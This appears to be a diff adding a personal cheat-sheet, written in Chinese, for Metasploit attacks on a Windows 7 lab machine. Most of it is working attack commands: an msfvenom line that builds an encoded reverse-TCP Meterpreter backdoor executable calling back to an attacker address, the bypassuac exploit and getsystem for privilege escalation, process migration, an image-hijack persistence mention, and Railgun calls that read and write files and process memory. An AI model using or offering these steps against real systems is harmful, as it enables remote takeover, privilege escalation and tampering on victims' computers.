@@ -1,0 +1,63 @@
+/////////////////////////////////////////////////
+msconfig  開機啟動
+regedit  登錄檔
+/////////////////////////////////////////////////
+
+%autohandler.rc 放到 /usr/share/metasploit-framework
+%%.rb 放到 /usr/share/metasploit-framework/scripts/meterpreter
+
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.235.134 lport=4455 -f exe -e x86/shikata_ga_nai > /root/Desktop/backdoor.exe
+
+將資料移到win7
+
+cd /usr/share/metasploit-framework
+msfconsole -r autohandler.rc
+
+點擊 win7 backdoor
+
+run isadmin  //看是否取得管理員
+
+ps
+migrate "explorer.exe"
+
+meterpreter > background
+msf > use exploit/windows/local/bypassuac
+msf exploit(bypassuac) > set session 1
+
+///兩次
+msf exploit(bypassuac) > set lhost 192.168.235.134
+msf exploit(bypassuac) > exploit
+///
+
+getsystem
+getuid
+
+/////////////////////////////////////////////////
+映像劫持 IFEO
+run railgundemo  %%%
+/////////////////////////////////////////////////
+
+/////////////////////////////////////////////////
+換桌面
+
+退回 sessions 1
+run urlmon    //下載圖片
+run myscript  //換圖片
+/////////////////////////////////////////////////
+
+/////////////////////////////////////////////////
+讀、看，檔案
+irb
+client.railgun.kernel32.CreateFileA("C:\\Users\\Siri\\Documents\\test.txt","GENERIC_WRITE|GENERIC_READ", "FILE_SHARE_READ|FILE_SHARE_WRITE", nil, "CREATE_NEW", 0, 0)   //寫入檔案
+client.railgun.kernel32.ReadFile(436,10,10,4,nil)   //("return","緩衝區","讀取數量","每次讀多少") //
+client.railgun.kernel32.CloseHandle(436)            //("return")
+/////////////////////////////////////////////////
+
+/////////////////////////////////////////////////
+記憶體
+>> p=client.sys.process.open(client.sys.process.getpid, PROCESS_ALL_ACCESS)
+>> p.memory.allocate(1024)
+>> client.railgun.memwrite(28508160,"AAAA",4)  //("記憶體位址","寫入","空間")
+>> client.railgun.memread(28508160,4)          //("記憶體位址","空間")
+/////////////////////////////////////////////////
